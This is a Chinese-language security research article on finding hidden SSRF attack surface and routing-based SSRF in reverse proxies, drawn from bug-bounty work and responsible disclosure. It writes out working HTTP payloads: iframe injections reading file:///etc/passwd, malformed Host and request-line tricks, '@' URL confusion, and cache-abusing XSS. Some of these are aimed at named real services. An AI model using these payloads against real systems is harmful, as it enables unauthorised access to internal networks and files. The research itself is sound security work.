
## 寻找 SSRF 漏洞的隐藏攻击面

许多服务端请求伪造漏洞很容易发现，因为应用程序的正常流量包含带有完整 URL 的请求参数。其他 SSRF 示例则更难定位。

### 请求中的部分 URL

有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。提交的值随后在服务器端被合并到被请求的完整 URL 中。如果该值容易被识别为主机名或 URL 路径，则潜在的攻击面可能是显而易见的。但是，由于您无法控制被请求的整个 URL，因此作为完整 SSRF 的可利用性可能受到限制。

### 数据格式中的 URL

某些应用程序以允许包含 URL 的格式传输数据，数据解析器可能会请求这些 URL。一个明显的例子是 XML 数据格式，它已被广泛用于 Web 应用程序中，以将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并解析它时，它可能容易受到 XXE 注入的攻击。它也可能通过 XXE 容易受到 SSRF 的攻击。我们将在研究 XXE 注入漏洞时更详细地介绍这一点。

#### PDF 生成器注入攻击

在某些情况下，服务器可能会将上传的文件转换为 PDF 格式。攻击者注入 HTML 链接载荷后被生成器解析时发出服务器端请求
- HTML 元素 `<iframe>`、`<img>`、`<base>` 、`<script>` 
- CSS 函数 `url()`

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

实例：
- https://nvd.nist.gov/vuln/detail/CVE-2022-35583

    wkhtmltopdf 0.12.6 存在 SSRF 漏洞，攻击者通过在 iframe 标签的 src 中注入初始资产 IP 地址，获取对目标系统的初始访问权限。这使攻击者能够通过访问内部资产来接管整个基础设施。

### 通过 Referer 头的 SSRF

某些应用程序使用服务端分析软件来跟踪访问者。此软件通常记录请求中的 Referer 头，以便跟踪传入的链接。通常，分析软件会访问 Referer 头中出现的任何第三方 URL。这样做通常是为了分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 头通常是 SSRF 漏洞的一个有用的攻击面。

## 方法论

### 监听

这条研究路线需要攻击那些设计为不可见的系统。因此，我们不能依赖分析响应内容来可靠地识别这些系统中的漏洞。相反，我们将发送设计为使这些系统**联系**我们的载荷（带外），并从由此产生的 DNS 查找和 HTTP 请求中学习。

回显记录工具
- Burp Collaborator
- 托管自己的日志 DNS 服务器
- [Canarytokens](https://canarytokens.org/)

### 研究管道

若把硬编码的回显载荷注入到所有浏览器流量中，将导致了缺乏上下文的大量回显。并且，某些载荷会在延迟一段时间后触发回显，或者在一种情况下定期持续触发。

Burp 扩展 Collaborator Everywhere 用来高效分类回显：它将包含唯一标识符的载荷注入到所有代理流量中，并使用这些标识符自动将回显与相应的攻击相关联。

### 规模化

Collaborator Everywhere 对于聚焦的手动驱动审计非常有效，本文披露的漏洞大约有一半是使用它发现的。然而，在这项研究期间，我注意到雅虎服务器上的一个特定漏洞在任意给定扫描中只有 30% 的几率被发现。根本原因是雅虎使用 DNS 轮询负载均衡通过三个不同的前端服务器之一路由入站请求，而只有其中一个服务器存在漏洞。这种特性对于专注于后端应用程序的典型安全审计来说无关紧要，但它们可能会破坏旨在破坏负载均衡器的利用。为确保没有易受攻击的服务器逃脱检测，有必要系统地识别目标基础设施的每一部分并定向发送载荷。

为此，我最初将 Burp Collaborator 客户端与一个修改版的 [Masscan](https://github.com/robertdavidgraham/masscan) 结合使用，但最终用 [ZMap/ZGrab](https://github.com/zmap/zgrab) 替换了 Masscan，因为 ZGrab 支持 HTTP/1.1 和 HTTPS。为了将回显与目标关联，我简单地在每个载荷前加上目标主机名，这样 `example.com` 中的漏洞将导致对 `example.com.collaboratorid.burpcollaborator.net` 的 DNS 查找。目标域和 IP 地址是通过从公共和私人漏洞赏金计划中手动构建可合法测试的域列表，并将其与 [Rapid7 的 Project Sonar Forward DNS 数据库](https://scans.io/study/sonar.fdns_v2) 进行映射获得的。这项技术识别了数百万个 IP 地址，其中大约 50,000 个在端口 80/443 上监听。我最初也尝试使用反向 DNS 记录，但这揭示了许多伪装成属于 Google 基础设施的服务器，它们可能不太乐意接受一次突袭式的安全审计。

如果载荷从未触及易受攻击的代码路径，向数万台服务器发送载荷几乎没有什么效果。为了最大化覆盖率:
- 每个 IP 使用了多达五个主机名
- 同时使用 HTTP 和 HTTPS
- 并尝试使用 `X-Forwarded-Proto: HTTPS` 和 `Max-Forwards` 触发边缘情况
- 还发送了 `Cache-Control: no-transform` 头，以阻止中间服务器破坏我的载荷

## 反向代理 - 错误路由请求

反向代理被委托将传入请求转发到适当的内部服务器。它们通常位于特权网络位置，直接接收来自互联网的请求，但可以访问公司的 DMZ，如果不是其整个内部网络的话。使用适当的载荷，一些反向代理可以被操纵，将请求错误路由到攻击者选择的目标。这有效地使它们成为一个网关，能够不受限制地访问目标的内部网络——一种超强版本的[服务端请求伪造](/web-security/ssrf)。以下是一个简单的攻击示意图：

请注意，此类攻击通常涉及高度格式错误的请求，这些请求可能会[破坏 ZAP 等工具](https://github.com/zaproxy/zaproxy/issues/1318)，并无意中利用属于您公司或 ISP 的中间网关。对于工具，我建议使用 Burp Suite（理所当然）、mitmproxy 和 Ncat/OpenSSL。

### 无效 Host

触发回显的最简单方法仅仅是发送一个不正确的 HTTP Host 头：

```http
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
Connection: close
```

尽管此技术在某些圈子里已经[为人所知多年](https://www.youtube.com/watch?v=ekUQIVUzDX4)，但它被大大低估了——使用它我成功利用了 27 台 DoD 服务器、我的 ISP、一个通过 DNS 投毒将自己置于火线上的哥伦比亚 ISP，以及 http://ats-vm.lorax.bf1.yahoo.com/。为了说明这个漏洞有多严重，让我们看看我在 ats-vm.lorax.bf1.yahoo.com 上利用该漏洞发现的一个内部服务器。

乍一看，完全不清楚该服务器运行的是什么软件：

```http
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:32:50 GMT
Transfer-Encoding: chunked
Connection: close

Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

不到一分钟后，由于一个乐观的 'HELP' 命令，我清楚地知道了该服务器运行的是什么软件以及如何与之通信：

```http
HELP / HTTP/1.1
Host: XX.X.XXX.XX:8082

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:33:59 GMT
Transfer-Encoding: chunked
Connection: keep-alive

Ok

  Traffic Server Overseer Port

  commands:
   get <variable-list>
   set <variable-name> = "<value>"
   help
   exit

  example:

   Ok
   get proxy.node.cache.contents.bytes_free
   proxy.node.cache.contents.bytes_free = "56616048"
   Ok

Variable lists are conf/yts/stats records, separated by commas

Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

众多 'Unknown Command' 行来自服务器将请求的每一行解释为单独的命令——它使用了一个换行符终止的协议，这使得通过经典的 SSRF 进行利用极其困难甚至不可能。

幸运的是，基于路由的 SSRF 更加灵活，我能够发出一个带有 POST 风格主体的 GET 请求，其中包含我选择的命令：

```http
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082
Content-Length: 34

GET proxy.config.alarm_email

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:57:02 GMT
Transfer-Encoding: chunked
Connection: keep alive

Ok
HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
proxy.config.alarm_email = "nobody@yahoo-inc.com"
```

使用 SET 命令，我本可以对雅虎的负载均衡器池进行广泛的配置更改，包括[启用 SOCKS 代理](https://docs.trafficserver.apache.org/en/latest/admin-guide/files/records.config.en.html#socks-processor)和授予我的 IP 地址权限以直接[将项目推入其缓存](https://docs.trafficserver.apache.org/en/latest/admin-guide/files/records.config.en.html#proxy-config-http-push-method-enabled)。

### 调查意图——BT

在尝试无效 Host 技术时，我注意到来自一小池 IP 地址的回显，这些回显是针对发送给完全不相关公司（包括 cloud.mail.ru）的载荷产生的。我最初假设这些公司一定共同使用了相同的云 WAF 解决方案，并注意到我可以诱骗它们将我的请求错误路由到其内部管理界面。但有些地方不太对劲；该 IP 池的反向 DNS 解析为 bn-proxyXX.ealing.ukcore.bt.net——BT 是英国电信，我公司的 ISP。对于发送到俄罗斯的载荷，从英国肯特收到回显几乎不是预期的行为。我决定使用 Burp Repeater 对此进行调查，并注意到响应在 50 毫秒内返回，对于一个据称从英国到俄罗斯，然后到爱尔兰数据中心中的 Collaborator 服务器，再通过俄罗斯返回英国的请求来说，这快得可疑。对端口 80 的 TCP 路由追踪揭示了真相：

与 cloud.mail.ru 建立 TCP 连接的尝试被我的 ISP 终止了。请注意，发送到 TCP 端口 443（HTTPS）的流量未被篡改。这表明进行篡改的实体不控制 mail.ru 的 TLS 证书，意味着拦截可能是在未经 mail.ru 授权或知晓的情况下进行的。我可以在办公室和家里都复现这种行为，这带来了一个有趣的可能性：GHCQ（英国政府通信总部）决定单独挑出我进行一些笨拙的深度包检测，而我不小心利用了他们的系统。我通过确认一些不那么可疑的朋友也能复现相同行为来排除了这种可能性，但这留下了问题：这个系统到底是干什么的？

为了辨别该系统的真实用途，我使用 Masscan 以 TTL 为 10 对整个 IPv4 地址空间的 TCP 端口 80 进行了 ping 扫描——实际上是一次全互联网路由追踪。在过滤掉缓存和自我托管的网站后，我得到了一个被针对的 IP 地址的完整列表。抽样此列表显示，该系统主要用于阻止对受版权保护内容的访问。发送到黑名单 IP 地址的流量被重新路由到代理池中，以便它们可以检查正在使用的 HTTP Host 头，并可能用一条我相信我们正直的英国读者都不熟悉的消息来阻止请求：

```http
GET / HTTP/1.1
Host: www.icefilms.info

HTTP/1.1 200 OK
...
<p>Access to the websites listed on this page has been blocked pursuant to orders of the high court.</p>
```

即使不更改 Host 头也可以绕过此阻止，但我将把这个问题留给读者作为练习。

这种设置有几个显著的后果。由于虚拟主机，像 Google Sites 这样的云主机最终被列入黑名单，意味着来自消费者和企业 BT 用户的所有流量都被代理。从黑名单服务器的角度来看，所有 BT 用户共享同一个很小的 IP 地址池。这导致 BT 代理的 IP 落在滥用黑名单上，并被许多网站禁止，影响所有 BT 用户。此外，如果我使用了前面提到的管理员访问漏洞来攻陷代理的管理面板，我可能会重新配置代理，将内容注入数百万 BT 客户的流量中。最后，这突显了这类漏洞是多么容易被忽视；多年来，我和许多英国渗透测试人员一直在通过一个可利用的代理进行黑客活动，甚至没有注意到它的存在。

我将能够访问内部管理面板的情况报告给了 BT 的一位私人联系人，他确保问题很快得到解决。他们还透露，该拦截系统最初是作为 CleanFeed 的一部分构建的，这是一项政府倡议，旨在阻止访问儿童虐待图像。然而，它不可避免地重新被用于打击版权侵犯。

### 调查意图——METROTEL

后来我在一个名为 METROTEL 的哥伦比亚 ISP 身上目睹了类似的行为。Rapid7 的 Project Sonar 使用了一个公共的 METROTEL DNS 服务器，该服务器选择性地对某些域进行投毒，以将流量重定向到其代理进行 DPI。为了在不引起证书错误的情况下通过 HTTPS 流量，他们从服务器名称指示（SNI）字段中嗅探预期的远程主机。我通知了 Rapid7，他们识别出了行为异常的 DNS 服务器，这意味着我可以将 Alexa 前 100 万域名列表输入其中并识别被针对的主机。它似乎针对各种图像和视频主机，以及一些不太知名的社交网络。尝试访问这些会导致重定向到 http://internetsano.metrotel.net.co/，称该网站因包含儿童虐待图像而被阻止。

与 BT 一样，该系统的原始意图可能值得称赞，但有证据表明它已被重新利用。除了针对图像托管网站外，该 DNS 服务器还对某些新闻网站（包括 bbc.co.uk）的查找进行投毒。这大概是为了阻止或篡改某些新闻文章，尽管我尚未确定哪些文章被针对。

### 处理输入排列

认为你真的理解了所有可能的意外情况通常是一个错误。以我遇到的以下七台服务器池为例；在收到以下请求时：

```http
GET / HTTP/1.1
Host: burpcollaborator.net
Connection: close
```

它们触发对 outage.<提供的域名> 的请求，并将该域名插入路径中两次：

```http
GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1
Host: outage.burpcollaborator.net
Via: o2-b.ycpi.tp2.yahoo.net
```

这种行为几乎无法预测，因此唯一合理的反应是确保您的设置能够通过使用通配符 DNS、通配符 SSL 和多种协议来处理意外活动。这种行为在利用方面看起来不太有希望，因为内部服务器不太可能在 /burpcollaborator.net/burpcollaborator.net 路径上托管敏感内容。幸运的是，如果您注册 outage.yourdomain.com 并使其解析到内部 IP 地址，则可以利用路径规范化向内部服务器的 Web 根目录发送请求：

```http
GET / HTTP/1.1
Host: ../?x=.vcap.me
Connection: close
```

导致以下请求：

```http
GET /vcap.me/../?=x=.vcap.me
Host: outage.vcap.me
Via: o2-b.ycpi.tp2.yahoo.net
```

规范化后，URL 变为 http://outage.vcap.me/?x=whatever。vcap.me 是一个方便的公共域，所有子域都解析到 127.0.0.1，因此此请求等效于获取 http://127.0.0.1/。

### Host 覆盖

我先前用于[创建投毒的密码重置电子邮件](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)的一种替代技术也在某个美国国防部服务器上奏效了。某些服务器有效地白名单化了 Host 头，但忘记了请求行也可以指定一个优先于 Host 头的主机：

```http
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
Connection: close
```

使用易受攻击的前端作为网关，我获得了对各种有趣的内部网站的访问权限，包括一个具有有希望攻击面的库和一个在公共论坛中提到的文件传输服务。

### 歧义请求

一些目标位于 Incapsula 的基于云的 Web 应用防火墙后面。Incapsula 依赖于检查 Host 头来确定将请求转发到哪个服务器，因此上述简单攻击不起作用。然而，Incapsula 对 Host 头的解析极其容忍它认为的指定端口，这意味着它“正确地”将以下请求路由到 incapsula-client.net：

```http
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
Connection: close
```

incapsula-client.net 的某个后端将此输入转换为 URL http://incapsula-client.net:80@burp-collaborator.net/，导致它尝试以用户名 'incapsula-client.net' 和密码 '80' 向 burp-collaborator.net 进行身份验证。除了暴露新鲜有趣的攻击面外，这还揭示了后端服务器的位置，使我能够通过直接访问后端来绕过 Incapsula 的保护。

### 打破预期

错误的请求路由漏洞并不总是由错误配置引起的。例如，以下代码导致了 New Relic 基础设施中的一个关键漏洞：

```java
Url backendURL = "http://public-backend/";
String uri = ctx.getRequest().getRawUri();

URI proxyUri;
try {
proxyUri = new URIBuilder(uri)
        .setHost(backendURL.getHost())
        .setPort(backendURL.getPort())
        .setScheme(backendURL.getScheme())
        .build();
} catch (URISyntaxException e) {
    Util.sendError(ctx, 400, INVALID_REQUEST_URL);
    return;
}
```

这段代码看起来可能无懈可击——它获取用户提供的 URL，将域替换为硬编码的后端服务器地址，然后传递过去。不幸的是，Apache HttpComponents 服务器库未能要求路径以 '/' 开头。这意味着当我发送以下请求时：

```http
GET @burp-collaborator.net/ HTTP/1.1
Host: newrelic.com
Connection: close
```

上面的代码将此请求重写为 `http://public-backend@burp-collaborator.net/` 并将请求路由到 burp-collaborator.net。像往常一样，这个漏洞让我访问了大量的内部内容，包括未认证的管理面板和令人费解的内部玩笑。

New Relic 将底层库问题报告给了 Apache HttpComponents，并且[随后已被修复](https://issues.apache.org/jira/browse/HTTPCLIENT-1803)，因此其他使用 Apache HttpComponents 的人不必恐慌。这不是第一次广泛使用的平台被证明容易受到这种精确载荷的攻击——它在 2011 年就[在 Apache mod_rewrite 上有效](https://www.contextis.com/resources/blog/server-technologies-reverse-proxy-bypass/)。然而，这显然不是常识；除了 New Relic，我发现它在 17 个不同的雅虎服务器上有效。

### 隧道

正如我们所见，使用 `@` 创建误导性 URL 这种经常被忽视的能力常常很有用。然而，并非所有系统都支持此类 URL，因此我尝试了先前载荷的一个变体：

```http
GET xyz.burpcollaborator.net:80/bar HTTP/1.1
Host: demo.globaleaks.org
Connection: close
```

其背后的想法是，易受攻击的主机可能会将请求路由到 public-backendxyz.burpcollaborator.net，这将由我们的通配符 DNS 捕获。我实际收到的是来自截然不同 IP 地址的一批混合大小写的 DNS 查找：

```log
xYZ.BurpcoLLABoRaTOR.neT.     from 89.234.157.254
Xyz.burPColLABorAToR.nET.     from 62.210.18.16
xYz.burpColLaBorATOR.net.     from 91.224.149.254
```

GlobaLeaks 使用 Tor2web 将入站请求路由到 Tor 隐藏服务，以隐藏其物理位置。Tor 出口节点使用一种[模糊的安全机制](https://tools.ietf.org/html/draft-vixie-dnsext-dns0x20-00)通过随机化请求的大小写来增加 DNS 的安全性，而这种机制导致 Burp Collaborator 服务器拒绝回复，从而触发了一波查找尝试。

这个独特的漏洞的影响很难量化。由于所有请求都通过 Tor 路由，它不能被滥用来访问任何内部服务。尽管如此，这是一种极其强大的方式来掩盖对第三方的攻击，特别是因为 GlobaLeaks 是一个举报平台，它可能不保存任何日志，并且最终可能被归咎于攻击。此外，使 Web 服务器通过 Tor 连接到恶意站点暴露了大量的攻击面。

## 针对辅助系统

我们在反向代理及其错误路由请求所需的技术上看到了显著的多样性，但最终的影响到目前为止或多或少保持一致。在本节中，我们将看到当针对后端分析系统和缓存等辅助系统时，找出真正有用的利用通常比首先触发回显更困难。

### 收集信息

与基于路由的攻击不同，这些技术通常不会妨碍网站的正常功能。Collaborator Everywhere 利用这一点，向每个请求注入多种不同的攻击：

```http
GET / HTTP/1.1
Host: store.starbucks.ca
X-Forwarded-For: a.burpcollaborator.net
True-Client-IP: b.burpcollaborator.net
Referer: http://c.burpcollaborator.net/
X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
Connection: close
```

#### X-Forwarded-For

一个容易触发但难以利用的回显技术示例是 X-Forwarded-For 和 True-Client-IP HTTP 头，它们通常被渗透测试人员用来伪造其 IP 地址，但也支持主机名。信任这些头的应用程序将执行 DNS 查找以将提供的主机名解析为 IP 地址。这很好地表明它们容易受到 IP 欺骗攻击，但除非您有一个方便的 DNS 库内存损坏漏洞，否则回显行为本身不可利用。

#### Referer

类似地，Web 分析系统通常会获取到达访客的 Referer 头中指定的任何未识别的 URL。一些分析系统甚至会出于 SEO 目的，尝试主动抓取 Referer URL 中指定的整个网站。这种行为可能很有用，因此值得指定一个宽容的 robots.txt 文件来鼓励它。这实际上是一个盲 SSRF 漏洞，因为用户无法查看分析系统请求的结果，并且它通常发生在用户请求后几分钟或几小时，这进一步使利用复杂化。

#### 重复参数

出于某种原因，Incapsula 会获取在查询字符串中指定两次的任何 URL。不幸的是，他们没有漏洞赏金计划，因此我无法调查这是否可利用。

#### X-Wap-Profile

X-Wap-Profile 是一个古老的 HTTP 头，应指定设备的用户代理配置文件（UAProf）的 URL，这是一个定义设备功能的 XML 文档，例如屏幕尺寸、蓝牙支持、支持的协议和字符集等：

```http
GET / HTTP/1.1
Host: facebook.com
X-Wap-Profile: http://nds1.nds.nokia.com/uaprof/N6230r200.xml
Connection: close
```

合规的应用程序将从该头中提取 URL，然后获取并解析指定的 XML 文档，以便定制它们提供给客户端的内容。这种两种高风险功能——获取不可信 URL 和解析不可信 XML——与晦涩且容易被忽略的功能相结合，似乎很适合被利用。不幸的是，它并未被广泛支持；Facebook 是我能找到的唯一使用它的漏洞赏金网站，而且他们似乎在进行 XML 解析时相当谨慎。他们也仅在请求后大约 26 小时才获取指定的 XML 文档，使得全面的迭代测试极其不切实际。

### 远程客户端攻击

在这些情况中，直接的 SSRF 式利用极其困难，因为我们没有从应用程序收到任何反馈。对此的一种反应是向内部网络喷洒现成的 RCE 载荷，比如当月最新的 Struts2 漏洞，这种方法有点类似于 lcamtuf 在 [Against the System: rise of the Robots](http://phrack.org/issues/57/10.html) 中的 Web 爬虫滥用。虽然有趣，但这种技术并不是特别有趣，因此我选择将焦点转移到连接到我们的客户端上。与反向代理一样，这类客户端通常很少被审计，容易受到现成工具的攻击。我能够从一台服务器窃取内存，仅仅通过让它建立 HTTPS 连接到一台对连接系统执行老牌的 client-heartbleed 攻击的服务器。像 PhantomJS 这样的无头浏览器通常已过时，缺少许多关键的安全补丁。基于 Windows 的客户端可能会向运行 SpiderLabs 的 [Responder](https://github.com/SpiderLabs/Responder) 的服务器主动提供域凭据，而 lcamtuf 的 [p0f](http://lcamtuf.coredump.cx/p0f3/) 可以揭示客户端在经常被伪造的 user-agent 背后实际在运行什么。

尽管应用程序通常会过滤 URL 输入，但许多库会透明地处理重定向，因此可能在重定向 URL 上表现出完全不同的行为。例如，Tumblr 的 URL 预览功能仅支持 HTTP 协议，但会愉快地遵循对 FTP 服务的重定向。这些技术很可能会由 Orange Tsai 目前未发布的研究来补充，该研究专注于利用编程语言的 URL 解析和请求库。

一些客户端做的远不止下载页面——它们实际上在渲染页面，并且在某些情况下执行其中的 JavaScript。这暴露了一个过于庞大而无法手动映射的攻击面，因此我的同事 Gareth Heyes 创建了一个名为“Rendering Engine Hackability Probe”的工具，旨在彻底指纹识别客户端的能力。除了识别自定义浏览器中的常见错误（例如忽略同源策略的执行）之外，它还会标记不寻常的 JavaScript 属性。

正如我们在这里看到的，它检测到了未被识别的 JavaScript 属性 'parity' 和 'System'，这些属性由 Parity 浏览器注入，以允许网站发起以太坊交易。未被识别的参数范围从略微有趣到极其有用。'parity' 属性可用于获取用户钱包的公钥，这实际上是一个全局唯一标识符，并且还透露了他们的余额。JXBrowser 允许开发者插入 JavaScript/Java 桥接，去年我们发现有可能利用这一点来[逃逸渲染器](https://portswigger.net/blog/rce-in-jxbrowser-javascript-java-bridge)并实现任意代码执行。配置不当的启用 JavaScript 的客户端也可能连接到 file:/// URL，这可以通过存储在环境变量中并在 /proc/self/environ 中显示的恶意 HTML 来窃取本地文件——一种跨协议盲 XSS 漏洞。除了直观地显示结果外，每项能力还会触发服务器端请求，因此即使您看不到渲染输出，它也同样有用。基本测试被设计为即使在不执行 JavaScript 的合理客户端上也能工作。

### 预缓存

在寻找路由漏洞时，我注意到某台军用服务器的一些奇怪行为。发送以下请求：

```http
GET / HTTP/1.1
Host: burpcollaborator.net
```

导致服务器返回正常响应，随后几秒钟后向 Collaborator 发送了几个请求：

```http
GET /jquery.js HTTP/1.1
GET /abrams.jpg HTTP/1.1
```

显然有什么东西在扫描发送给我的响应中的资源导入并获取它们。当它看到类似 `<img src="/abrams.jpg"/>` 的内容时，它会使用我提供的 Host 头将相对于主机的 URL 扩展为 http://burpcollaborator.net/abrams.jpg 并获取该文件，大概是为了缓存它。我通过直接从反向代理检索缓存的响应来证实了这一理论。这使得一种相当有趣的攻击成为可能——我在后端应用程序中发现了反射型 XSS，并利用它在响应中注入对内部服务器上假 JPG 的引用。

```http
POST /xss.cgi HTTP/1.1
Content-Length: 103
Connection: close

xss=<img src="http://internal-server.mil/index.php/fake.jpg"/>
```

缓存反向代理看到了这个资源导入并获取了该“图像”，将其存储在其缓存中，我可以轻松检索它：

```http
GET /index.php/fake.jpg
Host: internal-server.mil
Connection: close
```

请注意，使用 XSS 注入绝对 URL 意味着即使应用程序拒绝包含未识别 Host 头的请求，此攻击也能生效。为了帮助理解此攻击，我构建了易受攻击系统的副本，以便您可以[自行尝试利用它](http://hackxor.net/mission?id=4)。

## 结论

近年来，漏洞赏金计划的激增催生了一种新型研究；现在可以在十五分钟内针对数万台服务器评估一个新的攻击概念。通过这一点，我证明了反向代理中的小缺陷可能导致关键漏洞。为了实现任何形式的纵深防御，反向代理应被防火墙隔离到一个加固的 DMZ 中，与任何非公开可访问的内容隔离。

我还展示了如何揭示后端系统并深入了解其运作。虽然它们不像前端伙伴那样容易出现灾难性故障，但它们暴露了一个丰富且研究不足的攻击面。最后，我确保 Burp Suite 的扫描器能够检测路由漏洞，并发布了 Collaborator Everywhere 和 Hackability 作为开源工具，以推动进一步的研究。

关于利用反向代理和服务器链的不同角度，请查看 [Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)。
